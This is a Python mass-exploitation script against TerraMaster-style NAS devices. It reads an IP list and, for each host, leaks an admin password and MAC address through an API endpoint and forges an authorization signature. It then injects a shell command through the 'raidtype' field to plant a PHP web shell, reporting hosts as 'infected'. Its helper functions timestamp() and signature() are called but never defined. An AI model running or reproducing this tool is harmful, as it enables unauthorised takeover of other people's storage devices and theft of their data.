import sys
import threading
import requests
import os
import socket
import time
from queue import *
from threading import Thread
import base64
import urllib.parse
 
if len(sys.argv) < 2:
    sys.exit("\033[37mUsage: python "+sys.argv[0]+" <ip list>")

ips = open(sys.argv[1], "r").readlines()
queue = Queue()
queue_count = 0
command = "echo <?php shell_exec('payload');?>"

payload = {'raidtype': ';'+command, 'diskstring': 'XXXX'}

headers = {"User-Agent": "TNAS"}
 
info = open(str(sys.argv[1]),'a+')

data = {}
 
def test(ip):
    ip = str(ip).rstrip("\n")
    try:
        res = requests.get(ip+"/module/api.php?mobile/webNasIPS", headers=headers, verify=False)
        if (res.status_code == 200) and ('webNasIPS successful' in res.text) and ('mac' in res.text):
            print("[+] " + ip + " is vulnerable!")
            data = {'pwd':'', 'mac':'', 'timestamp':'', 'signature':''}
            data['pwd'] = res.text.split('PWD:')[1].split('\\n')[0].strip()
            data['mac'] = res.text.split('mac\\":\\"')[1].split('\\"}')[0].strip()
            data['timestamp'] = str(timestamp())
            last_3_mac = data['mac'][-9:].replace(':','')
            data['signature'] = signature(last_3_mac)
            
            
        headers2 = {"User-Agent": "TNAS", "Content-Type": "application/x-www-form-urlencoded", "Authorization": data['pwd'], "Signature": data['signature'], "Timestamp": data['timestamp'], "Upgrade-Insecure-Requests": "1"}    
        res = requests.post(ip+"/module/api.php?mobile/createRaid", data=payload, headers=headers2, verify=False)
        if (res.status_code == 200) and ('true' in res.text) and ('createRaid successful' in res.text):
            print("[+] infected!")
    except Exception:
        print("[-] " + ip + " is not vulnerable!")
        pass
 

def main():
    global queue_count
    print(command);
    for line in ips:
        line = line.strip("\r")
        line = line.strip("\n")
        queue_count += 1
        sys.stdout.flush()
        queue.put(line)
    sys.stdout.write("\n")
    i = 0
    while i != queue_count:
        i += 1
        try:
            input = queue.get()
            thread = Thread(target=test, args=(input,))
            thread.start()
            time.sleep(0.05)
        except KeyboardInterrupt:
            os.kill(os.getpid(), 9)
    thread.join()
    return


if __name__ == "__main__":
    main()
